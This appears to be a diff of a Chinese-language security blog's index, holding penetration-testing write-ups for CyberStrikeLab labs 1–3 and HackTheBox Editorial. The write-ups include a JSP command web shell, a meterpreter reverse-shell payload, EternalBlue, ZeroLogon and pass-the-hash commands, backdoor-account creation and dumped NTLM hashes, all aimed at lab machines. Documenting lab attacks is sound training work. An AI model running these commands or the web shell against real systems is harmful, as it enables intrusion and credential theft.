-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123310096.png" class title="image-20250303123310096">
-
-<p>永恒之蓝漏洞利用，尝试模块，发现 ms17_010_command 能够被利用</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use 19</span><br><span class="line">set COMMAND whoami</span><br><span class="line">set RHOSTS 172.16.233.2</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123725242.png" class title="image-20250303123725242">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;dir C:\&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123932158.png" class title="image-20250303123932158">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;type C:\flag.txt&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>拿到第二个旗帜 </p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124022556.png" class title="image-20250303124022556">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND &#x27;net user abcc 123@abc /add&#x27;</span><br><span class="line">set COMMAND &#x27;net localgroup Administrators abcc /add&#x27;</span><br><span class="line">set COMMAND &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124059122.png" class title="image-20250303124059122">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124302763.png" class title="image-20250303124302763">
-
-<p>远程桌面连接</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303124355986.png" class title="image-20250303124355986">
-
-<p>.\用户名 登录，成功登录</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303154731381.png" class title="image-20250303154731381">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303162638253.png" class title="image-20250303162638253">
-
-<h3 id="域成员-192-168-20-20"><a href="#域成员-192-168-20-20" class="headerlink" title="域成员 - 192.168.20.20"></a>域成员 - 192.168.20.20</h3><p>这台机器同样爆出了永恒之蓝，但一直利用失败，不过因为我们已经拿下域控制器，所以可以换一种方式，去拿域控制器的 hash，对域成员做 PTH 攻击 </p>
-<p>上线 MSF</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.20.10</span><br><span class="line">set lport 23231</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.208.138 LPORT=6666 -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure></div>
-
-<p>制作木马并上传，上传稍麻烦，因为隧道搭在 MSF，因此选择将木马上传到 192.168.10.10 主机上，通过 phpstudy 自带 php 开启 Web 服务，再通过 192.168.20.30 浏览器下载文件</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.exe -S 0.0.0.0:22222</span><br></pre></td></tr></table></figure></div>
-
-<p>访问并保存，运行即可</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303165436865.png" class title="image-20250303165436865">
-
-<p>运行时注意管理员身份运行</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173105964.png" class title="image-20250303173105964">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303165555703.png" class title="image-20250303165555703">
-
-<p>获取 hash</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173046901.png" class title="image-20250303173046901">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::</span><br><span class="line">cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::</span><br><span class="line">abcc:1106:aad3b435b51404eeaad3b435b51404ee:73f5d97549f033374fa6d9f9ce247ffd:::</span><br><span class="line">WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:a0cde4eb68e4a2345b888c83eed3b196:::</span><br><span class="line">CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:fba62b6152431813b79b5e71c41b16d0:::</span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 -q python3 psexec.py -hashes :94bd5248e87cb7f2f9b871d40c903927 cyberstrikelab.com/administrator@192.168.20.20</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173617800.png" class title="image-20250303173617800">
-
-<p>拿到最后的旗帜</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173712105.png" class title="image-20250303173712105">
-]]></content>
-      <categories>
-        <category>靶机系列</category>
-        <category>CyberStrikeLab</category>
-      </categories>
-      <tags>
-        <tag>综合渗透靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CyberStrikeLab-lab2</title>
     <url>/2025/03/07/CyberStrikeLab-lab2/</url>
-    <content><![CDATA[<p>目标：公司派遣测试某网络的安全性。目标是成功获取所有服务器的权限，以评估网络安全状况。 </p>
+    <content><![CDATA[<p><strong>难度: 简单</strong></p>
+<p>目标：公司派遣测试某网络的安全性。目标是成功获取所有服务器的权限，以评估网络安全状况。 </p>
 <p><strong>漏洞扫描：</strong></p>
 <p>对 192.168.10.* 网段进行扫描，发现 192.168.10.20 可能存在 CVE-2017-12615 历史漏洞，以及 192.168.10.10 74 CMS </p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell</span><br><span class="line">[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce</span><br></pre></td></tr></table></figure></div>
@@ -563,7 +565,7 @@
 
 
 
-<h2 id="独立工作站-192-168-10-10"><a href="#独立工作站-192-168-10-10" class="headerlink" title="独立工作站 - 192.168.10.10"></a>独立工作站 - 192.168.10.10</h2><p>骑士CMS 渗透，我对 808 端口进行目录扫描，扫描的同时对 Web 页面进行初步观测，尝试寻找 SQL 注入、SSRF 等常规 Web 漏洞，可惜并没有发现有效入口点</p>
+<h1 id="独立工作站-192-168-10-10"><a href="#独立工作站-192-168-10-10" class="headerlink" title="独立工作站 - 192.168.10.10"></a>独立工作站 - 192.168.10.10</h1><p>骑士CMS 渗透，我对 808 端口进行目录扫描，扫描的同时对 Web 页面进行初步观测，尝试寻找 SQL 注入、SSRF 等常规 Web 漏洞，可惜并没有发现有效入口点</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306211540734.png" class title="image-20250306211540734">
 
 <p>常规字典下扫描也没有发现特别信息</p>
@@ -574,7 +576,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307141020560.png" class title="image-20250307141020560">
 
-<h3 id="弱口令-爆破"><a href="#弱口令-爆破" class="headerlink" title="弱口令&#x2F;爆破"></a>弱口令&#x2F;爆破</h3><p>直接输入错误账户名，会回显管理员账号不存在，这使得很顺利地测试出管理员账号名 admin</p>
+<h2 id="弱口令-爆破"><a href="#弱口令-爆破" class="headerlink" title="弱口令&#x2F;爆破"></a>弱口令&#x2F;爆破</h2><p>直接输入错误账户名，会回显管理员账号不存在，这使得很顺利地测试出管理员账号名 admin</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307143442587.png" class title="image-20250307143442587">
 
 <p>简单测试一下密码就出来了，靶机并没有在这方面上难为人</p>
@@ -605,7 +607,7 @@
 
 
 
-<h2 id="域边界突破-192-168-10-20"><a href="#域边界突破-192-168-10-20" class="headerlink" title="域边界突破 - 192.168.10.20"></a>域边界突破 - 192.168.10.20</h2><h3 id="Tomcat-任意文件写入"><a href="#Tomcat-任意文件写入" class="headerlink" title="Tomcat 任意文件写入"></a>Tomcat 任意文件写入</h3><img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307220024288.png" class title="image-20250307220024288">
+<h1 id="域边界突破-192-168-10-20"><a href="#域边界突破-192-168-10-20" class="headerlink" title="域边界突破 - 192.168.10.20"></a>域边界突破 - 192.168.10.20</h1><h2 id="Tomcat-任意文件写入"><a href="#Tomcat-任意文件写入" class="headerlink" title="Tomcat 任意文件写入"></a>Tomcat 任意文件写入</h2><img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307220024288.png" class title="image-20250307220024288">
 
 <p>接下来对 192.168.10.20 已经发现的 Nday 进行利用，手工抓包上传，Payload 如下</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.20:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>
@@ -626,7 +628,7 @@
 <p>拿到第二个旗帜</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306195005976.png" class title="image-20250306195005976">
 
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><strong>上线CS</strong> </p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><strong>上线CS</strong> </p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306172133812.png" class title="image-20250306172133812">
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306172640657.png" class title="image-20250306172640657">
@@ -643,7 +645,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306201735177.png" class title="image-20250306201735177">
 
-<h3 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h3><p>开启 3389 后连接报错，是身份证验证错误，直接禁用掉</p>
+<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>开启 3389 后连接报错，是身份证验证错误，直接禁用掉</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306204251884.png" class title="image-20250306204251884">
 
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
@@ -655,7 +657,7 @@
 
 
 
-<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>继续对当前主机进行信息收集</p>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>继续对当前主机进行信息收集</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic computersystem get domainrole</span><br></pre></td></tr></table></figure></div>
 
 <p>返回数值为3，当前是一台域成员服务器</p>
@@ -670,13 +672,13 @@
 <p>fscan 扫描，发现域控服务器 192.168.20.30 且存在永恒之蓝漏洞</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306210846820.png" class title="image-20250306210846820">
 
-<h3 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h3><p>msf 打永恒之蓝，通过 admin&#x2F;smb&#x2F;ms17_010_command 模块执行成功，拿到 flag</p>
+<h2 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h2><p>msf 打永恒之蓝，通过 admin&#x2F;smb&#x2F;ms17_010_command 模块执行成功，拿到 flag</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307173614525.png" class title="image-20250307173614525">
 
 <p>修改管理员密码，打开 3389 端口，拿下远程桌面</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307174645182.png" class title="image-20250307174645182">
 
-<h3 id="代理转发上线-CS"><a href="#代理转发上线-CS" class="headerlink" title="代理转发上线 CS"></a>代理转发上线 CS</h3><p>之前直接利用 CS 的永恒之蓝漏洞插件攻击 20.30 失败，而我对上线 CS 又有执念。于是我尝试通过 iox 代理转发，给域控上传文件并上线 CS，因为实际上只需要做一层代理隧道，所以操作并不复杂。</p>
+<h2 id="代理转发上线-CS"><a href="#代理转发上线-CS" class="headerlink" title="代理转发上线 CS"></a>代理转发上线 CS</h2><p>之前直接利用 CS 的永恒之蓝漏洞插件攻击 20.30 失败，而我对上线 CS 又有执念。于是我尝试通过 iox 代理转发，给域控上传文件并上线 CS，因为实际上只需要做一层代理隧道，所以操作并不复杂。</p>
 <p>接下来 20.20 统称域成员主机，20.30 为域控</p>
 <p>首先生成 CS 马，配置为 <code>192.168.20.20:29999</code> 。然后在域成员跳板机开启第一层代理隧道</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iox.exe proxy -l 1080</span><br></pre></td></tr></table></figure></div>
@@ -712,9 +714,113 @@
       </tags>
   </entry>
   <entry>
+    <title>CyberStrikeLab-lab3</title>
+    <url>/2025/03/08/CyberStrikeLab-lab3/</url>
+    <content><![CDATA[<p><strong>难度:</strong> <strong>简单</strong></p>
+<p>目标：在192.168.10.0&#x2F;24网段发现了不得了的秘密。 </p>
+<p><strong>信息收集</strong></p>
+<p>探测存活主机、端口扫描、服务探测等，扫描全端口，发现 3590 端口开放了 Web 服务</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308122617851.png" class title="image-20250308122617851">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308165404764.png" class title="image-20250308165404764">
+
+<h1 id="边界机-192-168-10-10"><a href="#边界机-192-168-10-10" class="headerlink" title="边界机 - 192.168.10.10"></a>边界机 - 192.168.10.10</h1><p><strong>SQL 注入</strong></p>
+<p>目录扫描，发现后台管理员页面</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308124211025.png" class title="image-20250308124211025">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308124342546.png" class title="image-20250308124342546">
+
+<p>通过 taoCMS 默认账户密码登录后台</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/tao</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308124332636.png" class title="image-20250308124332636">
+
+<p>尝试数据管理 - 执行 SQL 模块</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308124637361.png" class title="image-20250308124637361">
+
+<p>权限级低，没有任何插入、更新或删除权限，日志包含、文件写入等操作走不通了</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308124648502.png" class title="image-20250308124648502">
+
+<p>taoCMS 还存在一个 SQL 注入的历史漏洞 CVE-2021-44915，可惜通过 MYSQL 获取 Shell 的条件很苛刻，也只能放弃</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308131916921.png" class title="image-20250308131916921">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308133536031.png" class title="image-20250308133536031">
+
+<h2 id="路径遍历-文件上传"><a href="#路径遍历-文件上传" class="headerlink" title="路径遍历 &amp;&amp; 文件上传"></a>路径遍历 &amp;&amp; 文件上传</h2><p>继续对历史漏洞进行检索，发现一个可利用的历史漏洞 CVE-2022-23880</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308125017782.png" class title="image-20250308125017782">
+
+<p>..&#x2F;..&#x2F;..&#x2F; 访问根目录，下载 Flag 文件，拿到第一个旗帜</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308125433242.png" class title="image-20250308125433242">
+
+<p>编辑文件，写入一句话木马，保存</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308130114153.png" class title="image-20250308130114153">
+
+<p>网站根目录就在当前路径，访问指定文件即可</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.10.10:3590/api.php</span><br></pre></td></tr></table></figure></div>
+
+<p>目标是 Windows 系统，上传木马并上线 CS</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308160819810.png" class title="image-20250308160819810">
+
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>发现内网另一个网段 192.168.20.10，lab1-7 的网络配置都一样。。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308161140192.png" class title="image-20250308161140192">
+
+<p>使用 fscan 对 20 段进行扫描</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308161343052.png" class title="image-20250308161343052">
+
+<h2 id="域成员-192-168-20-20"><a href="#域成员-192-168-20-20" class="headerlink" title="域成员 - 192.168.20.20"></a>域成员 - 192.168.20.20</h2><p>这台域成员机器甚至不需要进行漏洞利用，官方已经做了提示</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308165541499.png" class title="image-20250308165541499">
+
+<p>端口及服务探测，发现 8055 端口搭建了 Web 服务</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308163615065.png" class title="image-20250308163615065">
+
+<p>搭建内网隧道访问，发现对方用的是 ThinkPHP v5.0</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308165333805.png" class title="image-20250308165333805">
+
+<p>找了半天也没发现有什么明显遗留的木马文件</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308165507675.png" class title="image-20250308165507675">
+
+<p>只有找到两个 php 文件，index.php 和 router.php，使用一句话木马爆破脚本爆破一下</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308171158855.png" class title="image-20250308171158855">
+
+<p>访问拿到 第二个旗帜</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308171941408.png" class title="image-20250308171941408">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308171903895.png" class title="image-20250308171903895">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308174126831.png" class title="image-20250308174126831">
+
+<h2 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h2><h3 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h3><img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250308164230697.png" class title="image-20250308164230697">
+
+<p>使用 ZeroLogon 漏洞置空域控主机 hash</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30 </span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250309160806228.png" class title="image-20250309160806228">
+
+<p>然后拿下域控制器 hash</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py &#x27;cyberstrikelab.com/WIN-7NRTJO59O7N$@192.168.20.30&#x27; -no-pass</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250309164917519.png" class title="image-20250309164917519">
+
+<h3 id="PTH-攻击"><a href="#PTH-攻击" class="headerlink" title="PTH 攻击"></a>PTH 攻击</h3><p>PTH 攻击，远程命令执行 ，拿到最后的旗帜</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 -q python3 wmiexec.py Administrator@192.168.20.30 -hashes aad3b435b51404eeaad3b435b51404ee:f349636281150c001081894de72b4e2b -codec gbk</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/08/CyberStrikeLab-lab3/image-20250309165211809.png" class title="image-20250309165211809">
+
+]]></content>
+      <categories>
+        <category>靶机系列</category>
+        <category>CyberStrikeLab</category>
+      </categories>
+      <tags>
+        <tag>综合渗透靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HackTheBox - Editorial</title>
     <url>/2025/03/05/HackTheBox-Editorial/</url>
-    <content><![CDATA[<h2 id="外网信息探测："><a href="#外网信息探测：" class="headerlink" title="外网信息探测："></a>外网信息探测：</h2><p><strong>Nmap 服务探测</strong></p>
+    <content><![CDATA[<h1 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h1><p><strong>Nmap 服务探测</strong></p>
 <p>目标IP 10.10.11.20</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -n -Pn -sS -p- --min-rate 10000 10.10.11.20</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 18:28 CST</span><br><span class="line">Nmap scan report for 10.10.11.20</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">22/tcp open ssh</span><br><span class="line">80/tcp open http</span><br><span class="line"></span><br><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sTVC -O -p22,80 10.10.11.20 </span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)</span><br><span class="line">|_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://editorial.htb</span><br></pre></td></tr></table></figure></div>
 
@@ -744,7 +850,7 @@
  <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214926014.png" class title="image-20241021214926014">
 
 <p> 目标可以读取任何有效的 URL 内容，很显然这就像我们熟知的漏洞 - SSRF</p>
-<h2 id="SSRF内部端口识别："><a href="#SSRF内部端口识别：" class="headerlink" title="SSRF内部端口识别："></a>SSRF内部端口识别：</h2><p>通过该程序提供的 HTTP 请求功能，我尝试判断是否存在<strong>本地无法访问的服务端口</strong></p>
+<h1 id="SSRF内部端口识别"><a href="#SSRF内部端口识别" class="headerlink" title="SSRF内部端口识别"></a>SSRF内部端口识别</h1><p>通过该程序提供的 HTTP 请求功能，我尝试判断是否存在<strong>本地无法访问的服务端口</strong></p>
 <p>首先将表单信息改为127.0.0.1，端口改为80、22，这是已知的两个端口，分别提交。80端口等待了长时间才返回结果，而22端口立刻就返回了结果，结果仍然回显之前的错误图片</p>
  <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215635729.png" class title="image-20241021215635729">
 
@@ -781,7 +887,7 @@
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022102238058.png" class title="image-20241022102238058">
 
 <p>服务器特别像 Flask 或 Gunicorn 等框架，根据 Json 信息，推测它可能在运行基于Python 及 Flask 构建的 Web API 应用。这个应用负责处理 HTTP 请求，并响应 JSON 格式的数据，用于处理和管理用户、版本更新等信息，<strong>接下来我尝试去抓取这些API端点信息</strong></p>
-<h3 id="API端点信息获取："><a href="#API端点信息获取：" class="headerlink" title="API端点信息获取："></a>API端点信息获取：</h3><p>依次请求各个API</p>
+<h2 id="API端点信息获取"><a href="#API端点信息获取" class="headerlink" title="API端点信息获取"></a>API端点信息获取</h2><p>依次请求各个API</p>
 <p><a class="link" href="http://127.0.0.1:5000/api/latest/metadata/messages/coupons">http://127.0.0.1:5000/api/latest/metadata/messages/coupons<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022104448557.png" class title="image-20241022104448557">
 
@@ -796,7 +902,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110453419.png" class title="image-20241022110453419">
 
-<h2 id="dev-prod-用户移动："><a href="#dev-prod-用户移动：" class="headerlink" title="dev -&gt; prod 用户移动："></a>dev -&gt; prod 用户移动：</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>对内网进行基础信息枚举</p>
